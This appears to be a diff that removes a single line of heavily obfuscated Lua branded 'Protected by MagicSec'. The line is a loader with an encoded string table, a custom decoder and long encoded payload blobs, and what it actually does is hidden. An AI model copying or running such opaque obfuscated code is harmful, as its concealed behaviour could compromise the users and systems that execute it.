@@ -1,1 +1,226 @@
-("This file was Protected by MagicSec </> discord.gg/magicservices"):gsub('.+', (function(a) _ixTUbHtohyAC = a; end)); return(function(o,...)local f;local k;local d;local h;local t;local u;local e=24915;local n=#{};local l={};while n<815 do n=n+1;while n<0x140 and e%0x2a76<0x153b do n=n+1 e=(e+624)%48064 local r=n+e if(e%0x42f0)>=0x2178 then e=(e+0x3cf)%0x9139 while n<0x3db and e%0x4104<0x2082 do n=n+1 e=(e-997)%18072 local d=n+e if(e%0xf18)<0x78c then e=(e-0x3da)%0x4881 local e=10070 if not l[e]then l[e]=0x1 f=getfenv and getfenv();end elseif e%2~=#{}then e=(e-0x10e)%0xa6c0 local e=59696 if not l[e]then l[e]=0x1 k={};end else e=(e*0x232)%0x255c n=n+1 local e=25645 if not l[e]then l[e]=0x1 t=string;end end end elseif e%2~=#{}then e=(e*0xe7)%0xbd0b while n<0x302 and e%0x3b34<0x1d9a do n=n+1 e=(e-296)%20679 local d=n+e if(e%0x3536)>0x1a9b then e=(e-0x5a)%0x1f09 local e=60587 if not l[e]then l[e]=0x1 f=(not f)and _ENV or f;end elseif e%2~=#{}then e=(e-0x135)%0x304f local e=12288 if not l[e]then l[e]=0x1 u=tonumber;end else e=(e*0x1a1)%0x4a5a n=n+1 local e=60560 if not l[e]then l[e]=0x1 h="\4\8\116\111\110\117\109\98\101\114\120\111\115\72\87\114\90\116\0\6\115\116\114\105\110\103\4\99\104\97\114\120\106\65\77\113\85\77\73\0\6\115\116\114\105\110\103\3\115\117\98\109\65\97\90\88\101\84\99\0\6\115\116\114\105\110\103\4\98\121\116\101\103\84\89\104\99\97\107\108\0\5\116\97\98\108\101\6\99\111\110\99\97\116\114\66\74\108\112\113\87\117\0\5\116\97\98\108\101\6\105\110\115\101\114\116\111\116\87\120\83\102\65\103\5";end end end else e=(e-0x287)%0x6c8e n=n+1 while n<0x38f and e%0x476c<0x23b6 do n=n+1 e=(e*644)%21587 local h=n+e if(e%0x46ec)<=0x2376 then e=(e+0x10d)%0xbf53 local e=49859 if not l[e]then l[e]=0x1 d=function(d)local e=0x01 local function l(n)e=e+n return d:sub(e-n,e-0x01)end while true do local n=l(0x01)if(n=="\5")then break end local e=t.byte(l(0x01))local e=l(e)if n=="\2"then e=k.xosHWrZt(e)elseif n=="\3"then e=e~="\0"elseif n=="\6"then f[e]=function(n,e)return o(8,nil,o,e,n)end elseif n=="\4"then e=f[e]elseif n=="\0"then e=f[e][l(t.byte(l(0x01)))];end local n=l(0x08)k[n]=e end end end elseif e%2~=#{}then e=(e+0x7b)%0xc1eb local e=23449 if not l[e]then l[e]=0x1 end else e=(e+0x1b9)%0x6173 n=n+1 local e=55575 if not l[e]then l[e]=0x1 end end end end end e=(e-317)%8285 end d(h);local e={};for n=0x0,0xff do local l=k.xjAMqUMI(n);e[n]=l;e[l]=n;end local function r(n)return e[n];end local t=(function(o,t)local h,l=0x01,0x10 local n={{},{},{}}local f=-0x01 local e=0x01 local d=o while true do n[0x03][k.mAaZXeTc(t,e,(function()e=h+e return e-0x01 end)())]=(function()f=f+0x01 return f end)()if f==(0x0f)then f=""l=0x000 break end end local f=#t while e<f+0x01 do n[0x02][l]=k.mAaZXeTc(t,e,(function()e=h+e return e-0x01 end)())l=l+0x01 if l%0x02==0x00 then l=0x00 k.otWxSfAg(n[0x01],(r((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+d)%0x100)));d=o+d;end end return(function(n)local e;e='';for l=0x01,#n do e=e..n[l];end return e end)(n[0x01])end);d(t(135,"<Fzai7*Y4)9Db!h%YD%Y)bFi)75h4+a94hzYY!%7*!^bYh)zJ9DzY>ha*7D*za)!z)bab7a!h*9aFhY7hi7D!a7Yh*%4YzFD)9 %D*a9D7Fu)bmF*bdFF!)YahDha7!Y7D!F7DDDF4)zaJizDh*ahi7i!ai4%zYF%4*)b)iD!Fi#7)!iY9%*YFhi9aF7)Q!bYa%%i%D!%YYFFh)a#)94zz))az97n4)9%iFb)*a%D!zhbF7)hzi!!aiDD4aYiFDD*ihz7Yhh4ahY79ba*DD9ii**hz4Y/*Y4%FYIF%Y*FF4%%hY9%fi7Y!%4)hF9)*rhbFi+9bFh4%F*YYhYFD)7izDYa7b7*-hFa*9!i9)4aDisD9**!%7*t9Y)h+77bF7Yh7*z*7hF4)waYh%7Y.zF)iF!4)h!7*bDi*Yb%i)ha.9FzFbyz%94%!479%zY!z*%!)4_bD7ahDa9!4hz79t*9ht!DVz%)z%9YF.%F74!a9hDaD!hi%D4zibhF!i4b8*ht4*hFDY*h%Y*b9i)YD%7)!F))ai)DDz%9*zD4!zz4%95F)bza)%)*FbiizD*zYD9azibb7*%hYYD%%4F%F*7hi**b9%4YFF9)zi%)9Fb)!a79*FbY59iF!bYah%h*%b4*7bDa*DFzb7ubDYzh)**hz4b?)7)hF7%%4Yih9hh*)5%4YtzYbA44b3DY!j>*4ha7z4bB7DFzY!G74b7ihbDa)47Fia4DF7)!Y)i!)*!%*Y4ha7i!Fhi7!V7Y%5Y4%+!9)%*YwM%*9)_3)D4zb!a7)Di7iD7ia4!a7abD7*i!947h*7*h!Y)hi7)D)h4*Fp)4FaD)zz7)*%aYz+a*h)i,!DDaFbb74!h7799F%)aF7iMD)*4hf44Fi4D%7YabD7!bDhb*7F+4*z!9FF9Y9F%YYJ*Yz)4FFDbaFbh*a!)7*!4abDiZhiiD!*4!%)7hh4)!z4j%aiabz%>*9FF49cz9iah9!cD9z%4Y4!%F74%a*DFzYhF*o!*77bazb4YFIa9Di7D!*7ih*7*h)iD%zizD4iY7%!)4C%DY7zi9YzF4i!%*%!*Yi4i%h97z;)bztDYi79baz4!Fi)F9)zab9i7bzYCbY*7D7a49bFhD%bhi4h%*9hF)*2b*ah!YYb9ii!9%a*!Fi4%p4Dz_))i+h47F*)*FaF4)za)Daal!haFD*i%b)zaD%FFa!DY7h!97zha7):z7ihii%Dia%*z!b4a%%Yizi)Y%FYYha47_)4z4Yqf9hzz!jaYD!zbDYFY)LzYaa9b77!z4YhY7h!77!hDi9b%hz"));d(t(25,"?Q7!Ppz#_9hD 2LaL#2P7_Q5ap2!Da9a7!zhz7PQ7Daha  #D6_a#apQpL2L zQ_a72# 9DT_ #hz2p7QLQ!LP 7zPPahQ_hz_pPPQQ s 2z L97_#_!p7L 2972Qpah2_ PhP79#_p!P27!6aaP a  hP##p!#77_ zDQ>Q2 2zDQ!p_!z7PhPP7!2Da_h Dz_z_9P#Ph2z pQ!L L7 7hQ9#zDzp!97QQ7a7 PD7_ah3p_Pz!Q7LDW9DLL2kDDh!__zzp7!7QaLha_ a9z99#L#7Lh2z7 {qL_29D9PQ9###z,!_7QQ+a2  hy9zzL#zPz7! _DQE#L#2oh_9Q_rzaP272Z_La27h_D7!_7u#7pD!97pQ7LaLQ99hz#MpZ!zPP QDga72# 2h2_ _7pzpk7PE a222 Qh _a_i!L!Q!y7Q9D_P2_DQ9a#azPp 79Aa1_LL27D__z_!,#a7P7Q2Q#a7#zDLhD9p# zzQ !pQd2!Lp  DD_!Q_"));local e=(-k.rMmJIHng+(function()local f,l=k.uoxPDEXy,k.uwUKIHSi;(function(n,e)e(e(n,e),e(e,e and e))end)(function(n,e)if f>k.cnpReQC_ then return e end f=f+k.uwUKIHSi l=(l*k._jgx_CDi)%k.ciwoV_lb if(l%k.voqDbuLA)>k.VWUuoYrS then return e else return e(e(e,e)and n(e,n),e(n,n)and n(n,n))end return e(n(n,e and n),n(e,e))end,function(n,e)if f>k.Jiykxwkq then return e end f=f+k.uwUKIHSi l=(l+k.RnYSCrHY)%k.lJlqgjgC if(l%k.pvibZhPG)>=k.OqyUSwLv then l=(l*k.oeSOB_tx)%k.oiylWGCE return e(n(e,e)and e(n,e),e(e,n))else return e end return e end)return l;end)())local fe=(getfenv)or(function()return _ENV end);local a=k.sjcWWSBe or k.qYFUFgPF;local f=k.KCJpffBQ;local m=k.uwUKIHSi;local d=k.WHvHWvLq;local h=k.cIsycRPu;local function ne(b,...)local s=t(e,"s}kJQflq-8F/!52IqF8_5-k1lF/FI-Q_--}qq55QI/ffFFIlJ}qJ/5Fk22JSq-!*q/!QvFQ88l5q/Fy5Q-8G5-lI5lIJlQF825J2-!Ff}2ffFlIQ!FJ/f-Fh2--Q2Fk8lI/qI5fk8/FF5-k}/!IqI-Q-!2kklqF5F-QQq85kcIffF!F82-qI!F!bj8FQ2Fk}l!/f/-j-F}5Ik5k8QF8/5-k#l-I!lqFJ28J!l-!!Z8l885Ik!Fk/f-F&2-qQ55kll8!fWQfQl/5-}8qQ8/H8Q/8Q!5}5J/F-28QQf55ln5f2F!IJ!FkJf-FW2--l2}Jkq!!fI8Q!q}52k-qf/!55J8-2!8}qf5/k-F5q}-loF-JJFq22Jlqf//}Q2Ff8q-!Z=-/-.!fQ8-2JIkkIqqIQQ}8J!/}IlFFQ/lQk-q5g}FfI/TI8IlqJ!qK5}q8}2-k8Jq!qI5Qk8&5Ikql////I5FlEl-/.I-8QIXJ8-/-g=2f8FQ2f2--q/8}J.--.2FkIq!/fI/fQ-55Q5-lk!}/Hkf-}!I}8f/8J25JJJ-8!5qk2f-2QJ}-J//)IfF8QFlkqlIqI_fQ}-I58}/qJF5TkQ2-8!/}fl/Qk8f5^}-lDtqf8/n5Q}5qkF6}Qfq8-I}0}Q/fk8!2mk-qDk!l}//I/5FlQl-/<I-FkI-JklkFQ2FQ-l/IlI8f!FQ2FQA8IF-Jkq}-J}4Qk8}F}*Qlk/-hf6IlkFI9-qk8l5FP}8k8QG8JJ/}/}J-lm--wkk2F}!kJJfF!k>8k5-q52}/Q28!I8B5qQ5qIQl}-J2k4Qq!lkF8ICJ--nIq}klfFP2-J:!/kJqF/8h-fQQ-/!kql}F!IfJ!kk-I/vI-QZIhQQ-!5u}/kFlqFIk!q8!/nJfqFk5!22l/!kI8Qk8/82kIqQF2/IJ88<5}5IlIFf2FJ--q!I}JlJlq-k!5}Tf-FiJk8I5F 8l!fk8!2ek-qx_ll}/fIf5Fk!l-/EI-8J25Qk-2!f}FkFf-FfJ/}FlkFkI2J%q-!^Q88Q2qJxq!8T=fQfl-2QkFl}F!If}-l5F-kkf5F}2!Q8JF-2!-}4f-2lf}825!Plq}!kB/fQl/5-k}l!F!8k5/kol-/OlFFfI-5kkklbF-Ivq5I-k5qJ!5}QfqFk/k2K>Fff8-2ek-2ckFl8/lpQ5Fk8l-/HI-8I!/kqQ/5fkCJJl8!f!F}Qf-FB2-Fq58k8q!fk8I2*k-qaw5l2/JI2Qq8q5l/k_MQE--5bl!!}}Ffq85IQ3kJDf/FW2-J*q-!#D-f95-2kJIqw/-L^8!=8Q--f--5}l!FqF-QQ-q-v}/lQ88IkJ!J4!!}kQ88Q55!k}8f{8-2DqF5fk-l!/}IJJ88Q!5}QQ//QIqQkq8!q65IJJ--j!-}6J-II!5qwq/!=;-f*8-2xk-lrIq,kQ58m5-k;5/kDf8/qIl5kJ}lnF-In8k2fJFqIF/MfQ/-I!/JQqF/8wlQq8//-k}lQF!IfQll}5!kQlFQk8f57}-l(25l-852JJ5-Q!q}kkkf.85JJ}kfkFL2dk-q%(/l8FII5J8-/!52fIFQ/--5t}-F-}!lQF-5Jk5-k!2#8Q/8fqF5J3-fh8-}}f!F-I3J-q-!-KIfq8/2QJ}qk/5xQQ/8f5-k-JF8}!-}Uf-IJQ8F8!fkfq/!JI8Qq-5!k}5q}/5IfQ/8QlF5}I-QB--}}q!!I}-lQf-!5k5JZF!}kQ88Q552nf//JMFQ88-2Q5-Q}F/<QQ}8l!8kQf5FQ8k5F}FlqF-IDJ-5=JQq}5}affFFJq/!N3-fp8-2^k-8kI-aJQ-8X5-kvl-/iQl-O-F5l}-lpF-flFqIkJfq}!!Fk28J?q-!9Qffk8!29k-q_}Il}/fIf5/kol-/0I-QYL-}/f-lk!-IOJ--MJd-Q!!}hf/lFFq2Il!/83/QJ8q2k}!k2FIIq;q-}5-}8kq/q25Jk-+!I}qf/F/FI!F}/f-F72--Q58JklI/fT!}FQ-8fk/bFQ-QQ5-k^l-/%}qQR--5N}8lhF-IcQF85!-}if-!J2-J?q-5k}Zf,8-2{Q}q>/-{6l-8I5-k7l-/=I-l}--2k}2lrF8Iuf}-1!-}yq-/82-J}q-!}n-l58-2:Jkq:/-cEQF8a5Fk l2QkI-QN--5F}-l}F-IOJ--QJk}vf-FEIkJzq8!1n!/F8-26k-q8/-U}Q-Fkl/kvl-/g&JQ+--56J2q!F-IWJ--2!-}}f-FF2-JQ2k!bY-fOFl2=k8q9/-QIQ-8i5-k}l-/CI-fk2l5=}-lt!II:J--=5FQOf-F}2-J5q-!*C-fmFf2CkFq://xhQ-8R2FkJl-/JI-Q8--5)}-l(/FIUJ!-N!-}bf-FnIFQlq-!fi-f28-2Hk-qB!qZ_Q28n58kol-/9I-Q!--5J}-lJF-IlJ-8kkl}7f!FCI-JGq-!m,--I8-2fk-qP/->,Q-Fk5/kVl2/^plQU--5U}-l!F-IqJ--}!-}0f-F;dJJ1q!!h)!fM8I2.JFqI/-9fQ-!}5-kgl-/BK1Qr-25%}-lKF-IbQF8!!-}qf-F22-J%q-!&q!fcF92Sk8q:/-LvQ-/55-kfl-/fI-Q---5^}FlaFFI+J5-g!8}DlFI22-JJq-2fY-fZ8-Ikq!qY/!ioqJ8V5-kvqF/II-Qf--II}-lvF-}ZQ8-+!5}0f5F3}kJC8-5fe-ff8-2fk-qf/-}kfo8352kt8q/rI-QSF-2!}-llF-IlJ--}!-kklkFUIbJ0Fk!Uz-f98-LFk-ql/-C-Q-8k5-Jk!J/{IIQ7/q5^}-l1!-I!J--q!-}qf-F}2-Qk-/!t}}f%/q2%k-q{/-}5Q-8q5-k8l-/kI-fk2J5ikzlX5qI1J--P2-klf-F-2-J-q-!}(-lk/}2MJkq:52TtQ-8:5-JQl-/-I-QF--5k}-qk JIwQ}-(Iq}Cf-Fj.-Qlq-!8^-f88-2}k--k!!zwfJ815Ikcl-/nI-QJ--58}-l/F-IkJ--l+5}6lkF%I.Jdq8!*a!f48-Jkk-qV/-pfQ-8#5-k_/F/TI-QW-/5)}-lOF-QkJ--v!-}-f-FB2-JW!F!YD-f38F2^k-q&/2QfQ-8/5-kQl-/}I-Q}--5DlFl#F-IGJ5-E!-}XlFJJ2-J!q-2k:-f78-2ll5q=!f;.QI8L58kNl8/EI-8k--5e}-l/F-IZJ--;f!}#lQFy2FJ,q8!0928f8-2!k-qk/-+}Q-8}5-k7/F/.I-Q=8}5=}-l^F2JfJ--5!-}lf-F}2-Jkq-!YfFfY8-29k5q?/-m=Q-2k5-khl-/JI-Qy--5lf5l0/lILJ8-o!8}Tf8FV2--kq-!S+-ff8-2*k-qlI5Lpfq8;5/ktl8/:I8Q.--kk}-l%F-IfJ--=!-}l85FWI-JEq-! O8fp8821k-!k/-d3Q-8f5-k(l-/lJ5Q3885u}5lKF8IKJ8-G!-lkf-F62-Jfq-!X>-fS852=JFqx/-y+Q-8o52lfl-!JI-QF--5}}-l/F-I?-F-g!-}ZlFFm2-Joq-}k -fE8-2Fk-q:/-wX8F8S5-kWl2/0I-Q&--kk}-loF-IJJ--;!-}GFFFH2-J(-f!E3-f.8-Jkk-q4/-G!Q-8Y5-k_/F/oI-Qu8l5p}-laF-QkJ--y!-}If-F72-JH!F!,H-fbF82dk-qH/-fkQ-8c5-kQl-/pI-Q_5F50}-lC/-IiJ--,2-f2f-/Q2-Jqq-5fG-lk852&J2qW/23CQ-8N5-Jll-!QI-fl--5k}-llF!I.Q!-AJQ}Df8Fn2-JKq!kF=-f?8-Q!k-q}/-kCFk8r25kCq!/;kZQA-2lk}-qfF-f!J--}!-};f-FQfkJpq-!EqQfe882,Q-!F/-}fQ-FQ5-Q-l-5v}-Q>855&k5lUF/IMf-85!-kff-/f2-J-q-!lQ5f%FI2SJ}qZ/8xAQ!8t5-qkl-/MI-QJ--5_}-lBIFIgJ--S5k}Wf-F(2--kq-!RP-lJ8-21k-qNpF%zQ-8:55kVl-/(I-/---2f}-qqF-I}J--hJ!}>l5FbIkJnq-!A}F5I8-Ilk-qI/-vuQ-Fk2QkHqI/xIFQC--5*J-qJF-oqJ-8q!-J5f-/kI}J_8t!mJ}f+8-2cJF-8/-}8Q-/Q5-k^l-!kI!QxFk5ZQFl9F-I<QF-5!-k/f-/J2-Jjq-5kllfb/Q29Qlqv/-^uQ-FF5-J-l-!-I-f!--IA}Fl3!}IwJ5-65F}:f-/k2-QFq-!JU-fz8-IkQ}q^5JPcqq8y5-kc--/2I-f/--2/}-q}F-IlQ!-x2J}G5fF+28Jjq-!zL!/F8-2%k-25/-L}Q-8QQkk_l-/=qlQj-856kF/2F-z/J-8/!-}Pf-F>}kJ4-I!{kJfn8F2xJFq}/-}-Q-/w5-k%l-/ {/Qi855BJ{l F8IcQF8}!-kff-/-2-Jiq-5k}qfbF22Uflqj/-YwfFFk5-Jql-/kI-Q3--I9k-l9/IIuQI-r52}9lFF!2-Q-q-22K-fy8-Ik-lq)5}iLq-8m5-k9l-2fI-fq--28}-lkF-IaQ/-_52}yl2FwIIJvq-!qj-lf8-2kk-q}/-}kfF8;25k_-%/:I-Q>8F24}-qlF-:QJ--D!-}=f/F3I5JtqF!4p8fGFFIfk--f/-}-Q-8n5-Jk!l/ed2Q:/l5V}-lB/F}fJ-8q!-}kf-F#2-fe-Q!a}IfbFI2_J2qE!FvqQ-F-5-Q2l-/4I-fk8l5 J}l75-IwJ--V!-kJf-/q2-Q8q-!k6-fW8I2YJ2q0!2&{fI8x5-J.l-!fI-Qk--5}}-qkJ/IyQ5-;2C}Cf-FTIFJ/q-5l;-lq8-2bk-8b5f3PfI8O55kSqF/<I-f!--2l}-qlF-aqJ--c5F}Dl5FL2FJWq8!C}Ffk8-Ifk---/-*_Q-Fk58k=q2/=}QQW--5X}-qQF-%qJ--J!-}Xf-FifqJ,-2!*}2fhFI23k-/F/-}fQ-8k5-k}l-!k+!QD855gJYl9F-I*QF--!-klf-FQ2-Jjq-!ui!f0F52*kFq_/8>yfF8q5-Jfl-!-I-Q+--2kkFlz/2Ibll-d!-}&lFF52-Qqq-!kx-fu8-cE-kqn!ImMfI8x22k9qFk/I-f---I2}-l_F-RkQ!-:2}}6--F+2-J9q-!!%-lq8-I8k-qk/-9UfQ8&22kGq2/0*IQj--2/}-qfF-IkJ--}!-kk2/FvI5JZ-Q!mU-fZ/-fJk--f/-}fQ-FF5-Jk-Q/=W2Qx/Q5%}-l%F-:}J-8f!-}kf-Fk2-Jl-8!B}5fyQ/29k8qM/-#aQ!IF5-kdl-lJI-Q}--5Q-klhF-Ip2Q-_!8}3f-2I2-Jiq-!}K-f+8-2/k-q /-=FQ-845-kkl-/*I-QK-F52}-ltF-Jq85IQB!qf!/cJQ5825!k}ql!QE/2kkIqV/-SB82I8Q/-8!F}!f5Qk-/5v}-l,I}lJq8-k!!}_f-FdJ!8fIjJQmFff8-2_k-27}8l8/FHJ5Fkfl-/9I-/k25J}q!58FFI8J--y!-lN!Qt}l}8f2Fiqq5/88F2Fk-q^/-fQF5{-Q!lk55kQl!FIIl5k}5lNF-IuFQ2IJIqf!FFr9-JLq-!#}F/f8-2^k-ql/-w3Q-8PI}kWl8/7I-Qn--5DJ-lfF-I}J--}!-}-f-!&d}JWq8!u98fA8F2Vk--f/-)}Q-8k5-k=l-/a08QK--5_}-lHFFI+J!8n!-}hf-//2-J}q-2Hl}f%852*k!q_/!X7fF225-kql-/8I-Qm--51QklwF5I JI-:!F}3f2/}2-Jfq-!5d-f}8-2}k-qQkk.ZQ-8(2fk{l8/6I!FF--5j}-q/F-I}J-FCkk}4f5F>2!Jtq/!E#22k8-2fk--//-c}Q-8<5-kQ5k/EI-QKFJ5M}8l^!-QFJ--f!-}Qf-Ff2-Jl4F!pT5fHF!2Vk8qg/-B=Q!IF5-kWl-!QI-Q}--5Q-klVF-IxQ5-x!8}3lFI22-Jfq-!}U-fr8-%v-}qp/5K4Q58=2kkil-k5I-Qf--5k}-lkF-}lfQ-Z!5};qkF+28J,qI!Da!/F8-23k--F/-N}Q-8QQkkel-/C}JQ+-85X}-l5F-IQJ--k!-})f-Fl&lJ1q-!c6Ifr882(kFqW/!lFQ-8i5-kql-/}I-Q)5-5=}-l.F-IwJ--#!-}5f-F,2-Jkq-!wz-f02q2_k-q;/8dKQ-875-k9l-/hzkQt--5)}FlqF-IpJ-5lJ}-J!}MkfQ8fqF!2&-f#8-kq-52QI!lf//IJJ5-2!!}}ll/QI/5kk}l+F-I --2!k8-8/5}kkIFf2}!kn-f{8-2dkFqf/-B^Q-S{J8-85FkJIFQf--51}-5Q}Ff}8!2f!F}Qf-Fy2--Q55J-q!fkFk2ik-qRM!lf!6dQ}F8f5!kQlqF2-F5J}-l3F-J8F/!}!F}ff-FS2-8!2qJql5!k8-hck-q)/-}kF58w5-k3l5/CI-Qa--2/}-l}F-IaJ--n!-JgqZF,28J6q8!LZ/f0/-I-k-q}/-H}Q-8k5-kgqQ/&I8Q6-F5*}-lSF-_8J--{!-}9f-Fk2-JQ-k!<+-fD/J2Tk8q35-f8Q-8f5-kQl-/8I-fk2l5t}Il1/AI<J--C!-JFf-Ff2-Jqq-!kV-flF823k5qg!f;gQ88j58kSl!}FI-Q1--55}-l}F-IQFk-X!-}nqJF^28Jm8-}FK-ff8-2Qk-q}/-ulf88*55kLq8/;I8Q9-85v}!!FF-IvJ-8}!-}}f-FQfkJTq-!pkJfN882oQ-!F/-(fQ-8Q5-kql-/l-FQL-55>k5lwF8IpJ--S!!qFf-Fo2-Qfq-!}x-fQMk2Tk-qd!2buQ88R2Fq2l-/fI-QQ--5(}--+t}I1J5->!5}olkF?2-F5q-!f^-fk8-2kk-8lQ84MQ58MIJkpl8/AI2Qz-!JF}-lLF-P/J--}!-}.lfFh2!J#qF!B.-fV82I2k-qZ/-SqQ-8}5-kkl-/QlkQt--5v}Il_F8I9J-5Z!-}:f-FO2-JWq-!A}ffL8-2;kFq{/-p;Q-5I5-kol-/}I-QZ--54}-lWF-IkJ--#!-}kf5Fz2-Jx2-kJl8/!#Q2kk2qa/-:c8-I}QF-f5lkQI8f}--5+}-ll/8IpJ--n!/}:f8F128Jrq!kFH-f18-2Jk-q}/-0Q/k8t5-kBlI/%I8QuF-kF}-l}F-ISJ--k!-}l2FFN28JYqI!)E8fh8-20k!5F/-CcQ-8q5-k}l-/QlkQg--5Bk}l F8ISJ--f!-}}f-FV2-JZq-!4}ffD882hkFq=/-0<fFkJ5-k}l-/}I-Qz--5lf5lBFFIVJ--N!8}<fFFN2--kq-! _-fu8-2ck-qH224PQ-8g5-k;l-/yI-5Q--5}}-lkF-I}J--.!5}hf8F&28J?q-!vD-f58-2}k-qk/-eiQ-8wkqkel-/pI8Q --5K}8lWF-IOQ!-)!-}YfF/}2-J_q-Z5qq!f%/QflF2fk!qQ/qI2+8lJ5Q}8f/F/-/lF/}I8Q}-85}k8%q}kf!F62-J(2Ik}q}!Q8F2}k-q_/-f-QF8Q5-kyl-kQf8/JIJ5J}-l3F-IBJ--r5p5%fFFQ2-J#q-<lq}!kI52kJ!q%/-_<8/IfQl-Q/f}Il5/J25}k-55Q}!fIFl!fJ2qf!l}Q2FJ}q-!7D-F88F2lk-q3/-qkF8I2J!-I5f/kI!QG--5yqI!}}fffJF8k!-}if-IJQ5825!Z5qq!fz/Qfqf5Ik2lf-5clJ5-25!/JI-Qz--5v}-lVF-JCJ/-B!-}uf-FX2-J-/-!k}Qfb8-2Wl85kk/lI/QKfQ!-f//}8qkFf-/5 }-lHF-IuJ--C!-}kl-Fh2-JW/8kkq//IEQff8!5f{-lI//I8Q!-85q}2IFQ8--5_}-F}C/lQF}Ilk8-Q/5YQ2FJQq-!AD-/5I8fQ8nqJqU}2!5q/k85-*l2II--2--5C}-l3F-I#J--i!-}nf-F,(-Qlq-!XR-fd8-I}k-qh/5PMQ8865-kRl-/6}-fq--5}}-l}F-IIJ--l58}(f-F_2IJ6q8!.O8fE8!QFk-q{/-wqQ-8}5-kQ5k/^I-Qz!55p}8lbF23}J--}!-}Ff-F}2-J}q-!Qqkf:8-2bJkqi/8YVQ!IF5-kol-IfI-Q}--I>qklTFFI>J8-?!!}^llh}2-QTq-{f1-f}8-2kk-qQkk<AQ-86}5kEl8/W}-8F--5k}-l}F-I8J--22F}yl-FCI8Jeq8!VAFf08!QFk-qy/-}}Q-8}5-kQ5k/ZI-Q7!551}8lP!-QFJ--k!-}Hf-FQ2-fe8!!Z /fu882rk!qC5-}FQ-8J5-kJl-/5I-QYFQ5_}Fl FFI0J/-V5F}/f-FJ2-QJq-!jy-q4F-2;k/q6//Bjfk8X2Fkll-/QI-Ql--5*}-qk!JIcJ5-H5l}ef-FR2-fFq-!Jb-ff8-2kk-q?I-evQF8E5Fk.l//W}-QQ--5J}-lpF-I8J-FT2Q}yf!F(28Ji-}!<k-ff8-2Qk-qQ/-%5Q-8h2-kOl//#I/Q_-!5hkFlkF-IQJ-8J!-}Pf-!+28JEq!!Y4!f>Fk2<JF!2/-BfQ-8l5-kMl-!kQQQp-25ukllMF-I<J-8F!-}Qf-Fl2-Jkq-!1}If 8/2Dk/q7/!pNQ-F}5-kQl-/}I-Q{--Ih}/leF!ILJ!-P5Q}(f-/!2-Jlq-!kG-fw8-2bJqqH/I=uQ/8o5-kdqFZ2I-Q---2 }-lwF-ID8f-t!!}*lNF.28J{-F!/N-fQ8-2fk-q*/-k,fF8t5!k7l!/iI/Qr8F5l}-lfF-AQJ--=!-}EqkF*2!J qF!n#8f.8-28k-qQ/-a}Q-8+5-Q_q5/(I!Q_-!5Dk_lLF-lQJ--l!-}kf-Fr2-Ju5/!_pIf:8/2Pk-qG!F}-Q-8-5-Jtl-/DI-Q78Q5Vk}l3F8IXJ--45F}/f-FF2-J/q-!Wc-lkFJ2>JJq;!-<gQ-8d5-J!l-/QI-Q/--5}}-qk!JI3J!-,!5}Wf-FTY--Fq-!Q(-fQ8-2Jk--kkf;OQ58e5Fkgl-/+I-f8--5Q}-lkF-I}J--X52}zf!F_28JNq-!Xk-l-8-2Qk-qQ/-3-Q-832Ik^l2/AIFQ4--5?}-lIF-IqJ--J!-}of-/k25J_-:!y}-fm8-2dk-qf/-#8Q-835-k>l-!k-/QU8k5XkJl0F-IgQF52!-}/f-/p2-J_q-!i-XfC8!2+JJqm/8N^Q-I25-kkl-/_I-Q:--I9l4l+FFIMJF-v!I}alF/82-JQq-!}d-fu8-2aQTq>/F;0Q!8X58k7l-/FI-Qk--5_}-l)F-}iQq-o!F}+fFFn2IJx-F5F#-fQ8-Ikk-qr/-T^fI8W5Fk%l!/%I8Qn--}I}-l)F-I}J--+!-}yf-Fe2-JFq-!=d-fk8/2ck-qDz}qJ-88k5!k_l-/^Q!Ff&vQQ}FlfF-IgJ-ICk8q8!F}J2FJFq-!%3-FQI5f-8!/kk5qQ/!IIQlkkql/OI-Qg!IJf-!FQr5lJ8/2fJlqQ/802f!FJqF!8m-f08-Jh8Q5}J}lf/F5qQ5-8lF/qI-Q --kl-}5J}}fkFQ2f!F}tf-Fd2-Jkq5!9D-fGcQQI8I5fkFvkQ2805-kT!8}Jf/FfI-QQ}-q2F-I9J-8kk5}yf-F+2/Jtq-!&1-lQ8-2}k-qw/-rbQ-/R5/kHl8/1I8Qw-25<J-qkF-I}J--}!-}ff-FwIJJ+q8!:TFfK8-2ik-qf/-?PQ-8e5-kkl-/Q_-Qt--5NJ}ldF8I)f-58!-}ff-FQ2-J}q-5kllfL8I2&k!q=/-S0Q-/F5-kfl-/qI-Qk--5lFFlOF5I3f}-u!8}Af-F62!8Fq-!;;-l88-2}k-8:}k4(Q5865!kvlI/pI25k--5f}-q8F-I}J--z!-}Q!kFn2-Jb8}!E*8f?/-JFk-qf/-&QQ-8k5-klIF/KI5Q;8/5.}8lHF-IXJ!2F!-}Cf-/J2-J}q-!QqkfP8-2BJ!qd/8yYfF225-kfl-/-I-Q0--I,q}leF5I4J5-z5}}Uf-}52-Jfq-!kB-fk8-:l/8q_/57Gl}8058k_qk/XI!FF--5Z}-q8F-I}J--X5f}=f!FU2FJ=q-!1?2l28-2&k-qq/-S}Q-8k5-kQ5k/CI-Qa-I5n}8lcF-QGJ--:!-}?f-FM2-JU-f!v<-fm8F2:k-q7/-QIQ-8H5-k}l-/oI-Q)--5X}-l}F-ItJ--k!5}0f-Fpf-8J58k!qQf<852Nk-qK!F8JQ-845-k}l-/YI-Ql!55X}8lXF-IKJ8-e!8}Xf-5l2-Jpq-!Km-fE8-2P/!qM/-).QF8158kul-III-QN--5}}-l_F-I}J--u!-}Ff-F#2-Jkq5!Vu-fv<!fk-85Q}5jkQI8E5-kaF!}fl//QIFJI8}lkF!I%J--p}lq}!fyf2FJ8q-!Dj-Fv=QQ}F}5fkFQq/5I85Fkql-/VI-/k25Q}-5!f}/lQJF-f!-}Af-*!fqFq55JkyFfQ8-2 k-5lk}l2F!8k55kel-/)l-F}I}Qk-/lkF5IAJ--SJqql/2OffFJk-J!h1-fA5IQf8!/JkCl8/QIQQF-f5l/X}8Qg--5(kF!fF-I)J---!-}_f-F(2FJrq8!G.-f 